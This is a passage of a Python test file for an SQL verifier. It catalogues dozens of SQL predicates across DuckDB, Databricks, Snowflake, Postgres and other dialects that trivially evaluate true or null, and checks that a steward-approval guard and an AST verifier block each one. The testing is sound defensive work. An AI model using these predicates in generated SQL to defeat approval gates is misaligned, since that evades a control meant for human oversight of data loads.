        "LIST_RESIZE([TRUE], 1)[1]",
        "LIST_ZIP([TRUE], [1])[1][1]",
        "LIST_MAX([TRUE])",
        "LIST_MIN([TRUE])",
        "LIST_FILTER([TRUE, FALSE], lambda x: x)[1]",
        "ARRAY_FILTER([TRUE, FALSE], lambda x: x)[1]",
        "LIST_TRANSFORM([1], lambda x: TRUE)[1]",
        "LIST_TRANSFORM([1], lambda x: x = 1)[1]",
        "LIST_TRANSFORM([TRUE], lambda x: x)[1]",
        "LIST_TRANSFORM([[TRUE]], lambda y: LIST_TRANSFORM(y, lambda x: x)[1])[1]",
        "LIST_APPLY([1], lambda x: TRUE)[1]",
        "ARRAY_APPLY([1], lambda x: TRUE)[1]",
        "LIST_REDUCE([TRUE, TRUE], lambda a, b: a AND b)",
        "LIST_AGGR([TRUE], 'bool_and')",
        "ARRAY_AGGR([TRUE], 'bool_or')",
        "ARRAY_INTERSECT([TRUE], [TRUE])[1]",
        "MAP_CONCAT(MAP {'a': FALSE}, MAP {'b': TRUE})['b']",
        "MAP_VALUES(MAP_CONCAT(MAP {'a': TRUE}, MAP {'b': FALSE}))[1]",
        "MAP_ENTRIES(MAP {'a': TRUE})[1].value",
        "MAP_FROM_ENTRIES([{'key': 'a', 'value': TRUE}])['a']",
        "MAP_FROM_ENTRIES([STRUCT_PACK(k := 'a', v := TRUE)])['a']",
    ):
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {live_expr} = ANY(s.b)"
        ).fetchone()[0] == 1, live_expr

    for null_expr in (
        "CASE WHEN CAST(0 AS BOOLEAN) THEN 'ok' END",
        "CASE WHEN TRY_CAST(0 AS BOOLEAN) THEN 'ok' END",
        "CASE WHEN (1 IS DISTINCT FROM 1) THEN 'ok' END",
        "CASE WHEN (1 IS NOT DISTINCT FROM 2) THEN 'ok' END",
        "CASE WHEN (NULL IS DISTINCT FROM NULL) THEN 'ok' END",
        "CASE WHEN (1 / 1 = 2) THEN 'ok' END",
        "CASE WHEN (1 % 2 = 0) THEN 'ok' END",
        "CASE WHEN ('a' || 'b' = 'cd') THEN 'ok' END",
        "NULLIF(CAST(1 AS VARCHAR), '1')",
        "NULLIF('a' || 'b', 'ab')",
    ):
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {null_expr} = ALL(SELECT x FROM staging.empty_t)"
        ).fetchone()[0] == 1, null_expr

    for ctrl_expr in (
        "LIST_TRANSFORM(['a'], lambda x: x || 'b')[1]",
        "LIST_FILTER(['a', 'b'], lambda x: x = 'a')[1]",
        "LIST_REDUCE(['a', 'b'], lambda a, b: a || b)",
        "MAP_CONCAT(MAP {'a': 'x'}, MAP {'b': 'y'})['a']",
        "MAP_ENTRIES(MAP {'a': 'x'})[1].value",
        "COALESCE((SELECT ['ok']), ['fallback'])[1]",
        "(SELECT UNNEST(CASE WHEN FALSE THEN [NULL] ELSE ['ok'] END))",
        "(SELECT x FROM (SELECT UNNEST(CASE WHEN FALSE THEN [NULL] ELSE ['ok'] END) AS x) AS t)",
        "NULLIF('ok', (SELECT 'ok' OFFSET 1))",
        "NULLIF('ok', (SELECT 'ok' LIMIT 0))",
        "NULLIF('ok', (SELECT 'ok' WHERE FALSE))",
        "CASE WHEN CAST(1 AS BOOLEAN) THEN 'ok' ELSE 'no' END",
        "CASE WHEN (1 IS DISTINCT FROM 2) THEN 'ok' ELSE 'no' END",
        "CASE WHEN TRUE THEN 1 ELSE 0 END",
        "LIST_AGGR([1, 2], 'sum')",
        "LIST_AGGR(['a', 'b'], 'string_agg')",
    ):
        assert ddb.execute(f"SELECT {ctrl_expr}").fetchone() is not None, ctrl_expr

    for shadow_q in (
        "SELECT s.hk FROM staging.s AS s JOIN (SELECT 'k1' AS k, TRUE AS x) AS t ON s.hk = t.k "
        "WHERE s.steward_gate_status = 'APPROVED' AND (SELECT x FROM (SELECT 'ok' AS x) AS inner_t) = ANY(s.arr)",
        "WITH c AS (SELECT 'k1' AS k, TRUE AS x) "
        "SELECT s.hk FROM staging.s AS s JOIN c ON s.hk = c.k "
        "WHERE s.steward_gate_status = 'APPROVED' AND (SELECT x FROM (VALUES ('ok')) AS v(x)) = ANY(s.arr)",
    ):
        assert ddb.execute(shadow_q).fetchall() == [("k1",)], shadow_q
    ddb.close()

    # 2. Subquery wrapper clauses across all 8/8 SQL_TARGET_IDS
    subq_exprs = (
        "(CASE WHEN ((SELECT 1 AS x) LIMIT 0) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN ((SELECT 1 AS x) OFFSET 1) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN ((SELECT 1) ORDER BY 1 LIMIT 0) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN ((WITH c AS (SELECT 1 AS x) SELECT x FROM c) LIMIT 0) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN (WITH c AS ((SELECT 1 AS x) LIMIT 0) SELECT x FROM c) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN (SELECT 1 FROM (SELECT 1) AS t TABLESAMPLE BERNOULLI (0 PERCENT)) IS NULL THEN TRUE ELSE 'false' END)",
        "(CASE WHEN (SELECT 1 FROM ((SELECT 1) TABLESAMPLE BERNOULLI (0 PERCENT)) AS t) IS NULL THEN TRUE ELSE 'false' END)",
    )
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for s_expr in subq_exprs:
            u_sql = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {s_expr} = ANY(s.b)"
            )
            try:
                ast = sqlglot.parse_one(u_sql, read=dialect)
            except Exception:
                continue
            assert has_steward_approved_guard(ast) is False, (tid, s_expr)
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, s_expr)

    # 3. Blocked vectors across dialects (containers, lambdas, fail-closed, 3VL)
    blocked_vectors = (
        ("duckdb_local", "ARRAY_SORT([TRUE])[1]"),
        ("duckdb_local", "LIST_SORT([TRUE])[1]"),
        ("duckdb_local", "LIST_REVERSE_SORT([TRUE])[1]"),
        ("duckdb_local", "ARRAY_REVERSE_SORT([TRUE])[1]"),
        ("duckdb_local", "LIST_PACK(TRUE)[1]"),
        ("duckdb_local", "LIST_RESIZE([TRUE], 1)[1]"),
        ("duckdb_local", "ARRAY_RESIZE([TRUE], 1)[1]"),
        ("duckdb_local", "LIST_ZIP([TRUE], [1])[1][1]"),
        ("duckdb_local", "ARRAY_ZIP([TRUE], [1])[1][1]"),
        ("duckdb_local", "LIST_MAX([TRUE])"),
        ("duckdb_local", "LIST_MIN([TRUE])"),
        ("duckdb_local", "ARRAY_MAX([TRUE])"),
        ("duckdb_local", "ARRAY_MIN([TRUE])"),
        ("duckdb_local", "LIST_FILTER([TRUE, FALSE], lambda x: x)[1]"),
        ("duckdb_local", "ARRAY_FILTER([TRUE, FALSE], lambda x: x)[1]"),
        ("duckdb_local", "LIST_TRANSFORM([1], lambda x: TRUE)[1]"),
        ("duckdb_local", "LIST_TRANSFORM([1], lambda x: x = 1)[1]"),
        ("duckdb_local", "LIST_TRANSFORM([TRUE], lambda x: x)[1]"),
        ("duckdb_local", "LIST_TRANSFORM([[TRUE]], lambda y: LIST_TRANSFORM(y, lambda x: x)[1])[1]"),
        ("duckdb_local", "ARRAY_TRANSFORM([1], lambda x: x = 1)[1]"),
        ("duckdb_local", "LIST_APPLY([1], lambda x: TRUE)[1]"),
        ("duckdb_local", "ARRAY_APPLY([1], lambda x: TRUE)[1]"),
        ("duckdb_local", "LIST_REDUCE([TRUE, TRUE], lambda a, b: a AND b)"),
        ("duckdb_local", "ARRAY_REDUCE([TRUE, TRUE], lambda a, b: a AND b)"),
        ("duckdb_local", "LIST_AGGR([TRUE], 'bool_and')"),
        ("duckdb_local", "ARRAY_AGGR([TRUE], 'bool_or')"),
        ("duckdb_local", "LIST_AGGR([TRUE], 'first')"),
        ("duckdb_local", "LIST_AGGR([], 'sum')"),
        ("duckdb_local", "ARRAY_INTERSECT([TRUE], [TRUE])[1]"),
        ("duckdb_local", "MAP_CONCAT(MAP {'a': FALSE}, MAP {'b': TRUE})['b']"),
        ("duckdb_local", "MAP_VALUES(MAP_CONCAT(MAP {'a': TRUE}, MAP {'b': FALSE}))[1]"),
        ("duckdb_local", "MAP_ENTRIES(MAP {'a': TRUE})[1].value"),
        ("duckdb_local", "MAP_FROM_ENTRIES([{'key': 'a', 'value': TRUE}])['a']"),
        ("duckdb_local", "MAP_FROM_ENTRIES([STRUCT_PACK(k := 'a', v := TRUE)])['a']"),
        ("duckdb_local", "CASE WHEN CAST(0 AS BOOLEAN) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN TRY_CAST(0 AS BOOLEAN) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN 0::BOOLEAN THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (1 IS DISTINCT FROM 1) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (1 IS NOT DISTINCT FROM 2) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (NULL IS DISTINCT FROM NULL) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (1 / 1 = 2) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN (1 % 2 = 0) THEN 'ok' END"),
        ("duckdb_local", "CASE WHEN ('a' || 'b' = 'cd') THEN 'ok' END"),
        ("duckdb_local", "NULLIF(CAST(1 AS VARCHAR), '1')"),
        ("duckdb_local", "NULLIF('a' || 'b', 'ab')"),
        ("duckdb_local", "UNKNOWN_HOF([1], lambda x: TRUE)"),
        ("duckdb_local", "ARRAY_UNKNOWN_FN([TRUE])[1]"),
        ("duckdb_local", "MAP_UNKNOWN_FN(MAP {'a': TRUE})['a']"),
        ("duckdb_local", "LIST_AGGR([1], 'unknown_agg')"),
        ("databricks_uc", "TRANSFORM(ARRAY(1), x -> TRUE)[1]"),
        ("databricks_uc", "FILTER(ARRAY(TRUE), x -> x)[1]"),
        ("databricks_uc", "REDUCE(ARRAY(TRUE), FALSE, (a, b) -> a OR b)"),
        ("databricks_uc", "ARRAY_SORT(ARRAY(TRUE))[1]"),
        ("databricks_uc", "MAP_CONCAT(MAP('a', FALSE), MAP('b', TRUE))['b']"),
        ("databricks_uc", "MAP_ENTRIES(MAP('a', TRUE))[1].value"),
        ("databricks_uc", "MAP_FROM_ENTRIES(ARRAY(STRUCT('a', TRUE)))['a']"),
        ("postgres", "ARRAY_SORT(ARRAY[TRUE])[1]"),
        ("postgres", "JSON_BUILD_OBJECT('a', TRUE)->'a'"),
        ("postgres", "JSONB_BUILD_OBJECT('a', TRUE)->>'a'"),
        ("postgres", "JSONB_BUILD_OBJECT('a', TRUE)['a']"),
        ("snowflake", "ARRAY_COMPACT(ARRAY_CONSTRUCT(TRUE))[0]"),
        ("snowflake", "ARRAY_CONSTRUCT_COMPACT(TRUE)[0]"),
        ("snowflake", "ARRAY_INSERT(ARRAY_CONSTRUCT(FALSE), 0, TRUE)[0]"),
        ("snowflake", "ARRAY_REMOVE_AT(ARRAY_CONSTRUCT(TRUE, FALSE), 1)[0]"),
        ("snowflake", "ARRAY_EXCEPT(ARRAY_CONSTRUCT(TRUE), ARRAY_CONSTRUCT(FALSE))[0]"),
        ("snowflake", "OBJECT_INSERT(OBJECT_CONSTRUCT('x', 1), 'a', TRUE):a"),
        ("snowflake", "GET(OBJECT_INSERT(OBJECT_CONSTRUCT('x', 1), 'a', TRUE), 'a')"),
    )
    for b_tid, b_expr in blocked_vectors:
        dialect = get_dialect_profile(b_tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {b_expr} = ANY(s.b)"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {b_expr} = ANY(s.b)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            b_tid, b_expr
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, b_tid, extra_unstructured_links=["lnk_u"])
        ), (b_tid, b_expr)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, b_tid)
        ), (b_tid, b_expr)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(b_tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    # 4. Valid non-boolean controls & inner-select shadowing controls (0 FPs)
    valid_controls = (
        ("duckdb_local", "LIST_TRANSFORM(['a'], lambda x: x || 'b')[1]"),
        ("duckdb_local", "LIST_FILTER(['a', 'b'], lambda x: x = 'a')[1]"),
        ("duckdb_local", "LIST_REDUCE(['a', 'b'], lambda a, b: a || b)"),
        ("duckdb_local", "MAP_CONCAT(MAP {'a': 'x'}, MAP {'b': 'y'})['a']"),
        ("duckdb_local", "MAP_ENTRIES(MAP {'a': 'x'})[1].value"),
        ("duckdb_local", "COALESCE((SELECT ['ok']), [TRUE])[1]"),
        ("duckdb_local", "(SELECT UNNEST(CASE WHEN FALSE THEN [NULL] ELSE ['ok'] END))"),
        ("duckdb_local", "(SELECT x FROM (SELECT UNNEST(CASE WHEN FALSE THEN [NULL] ELSE ['ok'] END) AS x) AS t)"),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' OFFSET 1))"),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' LIMIT 0))"),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' WHERE FALSE))"),
        ("duckdb_local", "CASE WHEN CAST(1 AS BOOLEAN) THEN 'ok' ELSE TRUE END"),
        ("duckdb_local", "CASE WHEN (1 IS DISTINCT FROM 2) THEN 'ok' ELSE TRUE END"),
        ("duckdb_local", "CASE WHEN TRUE THEN 1 ELSE 0 END"),
        ("duckdb_local", "LIST_LENGTH(s.arr)"),
        ("duckdb_local", "ARRAY_LENGTH(s.arr)"),
        ("duckdb_local", "MAP_KEYS(s.m)"),
        ("duckdb_local", "ARRAY_POSITION(s.arr, 'x')"),
        ("duckdb_local", "LIST_AGGR([1, 2], 'sum')"),
        ("duckdb_local", "LIST_AGGR(['a', 'b'], 'string_agg')"),
        ("postgres", "JSON_BUILD_OBJECT('a', 'ok', 'b', TRUE)->'a'"),
        ("snowflake", "OBJECT_INSERT(OBJECT_CONSTRUCT('x', TRUE), 'a', 'ok'):a"),
    )
    for ok_tid, ok_expr in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} = ANY(s.arr)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)



    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter34_lexical_scope_lambdas_containers_and_null_guards() -> None:
    """Remediate r1 ScopedSmap, recursive subquery nullability, MAP_KEYS/JSON/agg, lambda, and empty/3VL gaps."""
    import duckdb

    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    # 1. Live DuckDB proof of r1 bypasses & 3-level correlated shadowing control
    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], m MAP(VARCHAR, VARCHAR))"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], MAP {'a': 'ok'})"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")
    ddb.execute("CREATE TABLE staging.t2 (x VARCHAR)")
    ddb.execute("INSERT INTO staging.t2 VALUES ('ok')")

    live_bool_preds = (
        "MAP_KEYS(MAP {TRUE: 'a'})[1] = ANY(s.b)",
        "MAP_KEYS(MAP_FROM_ENTRIES([(TRUE, 'a')]))[1] = ANY(s.b)",
        "MAP_KEYS((SELECT MAP {TRUE: 'a'}))[1] = ANY(s.b)",
        "MAP_KEYS(MAP {TRUE: 'a'})[1] = ANY(SELECT COUNT(*) > 0 FROM staging.s)",
        "CONCAT([TRUE])[1] = ANY(s.b)",
        "CONCAT([FALSE], [TRUE])[2] = ANY(s.b)",
        "REPEAT([TRUE], 1)[1] = ANY(s.b)",
        "AGGREGATE([TRUE], 'bool_and') = ANY(s.b)",
        "AGGREGATE([TRUE], 'first') = ANY(s.b)",
        "FROM_JSON('{\"a\":true}', '{\"a\":\"BOOLEAN\"}').a = ANY(s.b)",
        "FROM_JSON_STRICT('{\"a\":true}', '{\"a\":\"BOOLEAN\"}').a = ANY(s.b)",
        "UNION_EXTRACT(CAST(TRUE AS UNION(a BOOLEAN, b INT)), 'a') = ANY(s.b)",
        "CONSTANT_OR_NULL(TRUE, 1) = ANY(s.b)",
        "REMAP_STRUCT({'a': TRUE}, {'a': TRUE}, {'a': 'a'}, NULL).a = ANY(s.b)",
        "LIST_RESIZE([FALSE], 2, TRUE)[2] = ANY(s.b)",
        "LIST_TRANSFORM(['a', 'b'], lambda x, i: CASE WHEN i = 0 THEN 'ok' ELSE TRUE END)[2] = ANY(s.b)",
        "LIST_TRANSFORM([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17], lambda x: CASE WHEN x = 17 THEN TRUE ELSE 'false' END)[17] = ANY(s.b)",
    )
    for pred in live_bool_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    live_null_preds = (
        "COALESCE((SELECT (SELECT ['ok'] LIMIT 0)), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "COALESCE((SELECT (SELECT ['ok'] WHERE FALSE)), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "COALESCE((SELECT (SELECT ['ok'] OFFSET 1)), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "COALESCE((SELECT (SELECT UNNEST([['ok']]) LIMIT 0)), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "COALESCE((SELECT (SELECT ['ok'] FROM staging.s LIMIT 0)), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "COALESCE((SELECT (SELECT ['ok'] FROM staging.empty_t)), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT UNNEST(['ok']) LIMIT 0) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' LIMIT 0) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' OFFSET 1) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' WHERE FALSE) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT ['a'] WHERE FALSE)[1] = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((SELECT 'ok' LIMIT 0), 'no') = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT UNNEST([])) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM(['a', 'b'], lambda x, i: CASE WHEN i = 2 THEN NULL ELSE x END)[2] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM(['a', 'b'], lambda x, i: CASE WHEN i = 1 THEN NULL ELSE x END)[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'], lambda x: CASE WHEN x = '17' THEN NULL ELSE x END)[17] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM(['a','a','a','a','a','a','a','a','a','a','a','a','a','a','a','a', NULL], lambda x: x)[17] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_REDUCE(['1', '2'], lambda acc, x: CASE WHEN acc = '1' THEN NULL ELSE x END, '0') = ALL(SELECT x FROM staging.empty_t)",
        "LIST_REDUCE(['a', 'b', 'c'], lambda a, b: CASE WHEN a = 'ab' THEN NULL ELSE a || b END) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_REDUCE(['a','a','a','a', NULL], lambda a, x: x) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_REDUCE(['1','2','3','4','5'], lambda acc, x: CASE WHEN x = '5' THEN NULL ELSE x END, '0') = ALL(SELECT x FROM staging.empty_t)",
        "LIST_AGGR([]::VARCHAR[], 'first') = ALL(SELECT x FROM staging.empty_t)",
        "LIST_AGGR([NULL::INT], 'sum') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_AGGR(LIST_FILTER([1], lambda x: FALSE), 'sum') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_AGGR(CASE WHEN FALSE THEN [1] ELSE []::INT[] END, 'sum') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_FILTER([], lambda x: TRUE)[1] = ALL(SELECT 1 WHERE FALSE)",
        "LIST_FILTER(CAST([] AS VARCHAR[]), lambda x: x = 'a')[1] = ALL(SELECT x FROM staging.empty_t)",
        "CAST([] AS BOOLEAN[])[1] = ALL(SELECT TRUE WHERE FALSE)",
        "LIST_MAX(CAST([] AS VARCHAR[])) = ALL(SELECT x FROM staging.empty_t)",
        "MAP([], [])['k'] = ALL(SELECT x FROM staging.empty_t)",
        "TRY_CAST('abc' AS INT) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(CAST('abc' AS INT)) = ALL(SELECT 1 WHERE FALSE)",
        "SPLIT('a', ',')[2] = ALL(SELECT x FROM staging.empty_t)",
        "RANGE(0)[1] = ALL(SELECT 1 WHERE FALSE)",
        "LIST_SUM(CAST([] AS INT[])) = ALL(SELECT 1 WHERE FALSE)",
        "LIST_SUM([NULL::INT]) = ALL(SELECT 1 WHERE FALSE)",
        "LIST_POSITION(CAST([] AS VARCHAR[]), 'a') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_INDEXOF(CAST([] AS VARCHAR[]), 'a') = ALL(SELECT 1 WHERE FALSE)",
        "JSON_TYPE(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN NOT CAST(2 AS BOOLEAN) THEN 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN CAST(0.0 AS BOOLEAN) THEN 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF('a' || 1, 'a1') = ALL(SELECT x FROM staging.empty_t)",
    )
    for pred in live_null_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    same_alias_bypass_preds = (
        "(SELECT x FROM (SELECT 1 AS a) AS t) = ANY(s.b)",
        "(SELECT t.x FROM (SELECT 1 AS a) AS t) = ANY(s.b)",
    )
    for pred in same_alias_bypass_preds:
        q = (
            "SELECT s.hk FROM staging.s AS s "
            f"JOIN (SELECT 'k1' AS k, TRUE AS x) AS t ON s.hk = t.k WHERE {pred}"
        )
        assert ddb.execute(q).fetchall() == [("k1",)], q

    corr3_sql = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
        "JOIN (SELECT 'k1' AS k, TRUE AS x) AS t1 ON s.hk = t1.k "
        "WHERE s.steward_gate_status = 'APPROVED' "
        "AND (SELECT (SELECT x FROM (SELECT 'ok' AS y) AS t3) FROM (SELECT 'ok' AS x) AS t2) = ANY(s.arr)"
    )
    assert ddb.execute(
        corr3_sql.replace("INSERT INTO raw_vault.lnk_u (hk_u) ", "")
    ).fetchall() == [("k1",)]
    ddb.close()

    # 2. Verify all DuckDB + cross-dialect bypasses are blocked across DV-AST-006, DV-AST-007, and TargetEvalGate
    all_dialect_vectors: list[tuple[str, str]] = [
        ("duckdb_local", p) for p in (*live_bool_preds, *live_null_preds)
    ] + [
        ("databricks_uc", "MAP_KEYS(MAP(TRUE, 'a'))[0] = ANY(s.b)"),
        ("databricks_uc", "REVERSE(ARRAY(TRUE))[1] = ANY(s.b)"),
        ("databricks_uc", "CONCAT(ARRAY(TRUE))[1] = ANY(s.b)"),
        ("databricks_uc", "SHUFFLE(ARRAY(TRUE))[1] = ANY(s.b)"),
        ("databricks_uc", "FROM_JSON('{\"a\":true}', 'a BOOLEAN').a = ANY(s.b)"),
        ("snowflake", "PARSE_JSON('{\"a\":true}'):a = ANY(s.b)"),
        ("snowflake", "TRY_PARSE_JSON('true') = ANY(s.b)"),
        ("snowflake", "TRY_PARSE_JSON('{\"a\":true}'):a = ANY(s.b)"),
        ("bigquery", "JSON_QUERY('{\"a\":true}', '$.a') = ANY(s.b)"),
        ("sqlserver_fabric", "JSON_QUERY('{\"a\":true}', '$.a') = ANY(s.b)"),
    ]
    for tid, pred in all_dialect_vectors:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, tid)
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_b:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_b.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_b.value.exit_code == 50

    for pred in same_alias_bypass_preds:
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"JOIN (SELECT 'k1' AS k, TRUE AS x) AS t ON s.hk = t.k "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read="duckdb")) is False, pred
        assert any(
            d.rule_id == "DV-AST-007" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, "duckdb_local", extra_unstructured_links=["lnk_u"])
        ), pred

    # 3. 8/8 SQL_TARGET_IDS coverage for portable 3VL, subquery, and NULLIF bypasses
    portable_preds = (
        "(SELECT 'ok' LIMIT 0) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' OFFSET 1) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' WHERE FALSE) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((SELECT 'ok' LIMIT 0), 'no') = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN NOT CAST(2 AS BOOLEAN) THEN 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN CAST(0.0 AS BOOLEAN) THEN 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF('a' || 1, 'a1') = ALL(SELECT x FROM staging.empty_t)",
    )
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for pred in portable_preds:
            u_sql = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
            )
            try:
                ast = sqlglot.parse_one(u_sql, read=dialect)
            except Exception:
                continue
            assert has_steward_approved_guard(ast) is False, (tid, pred)
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
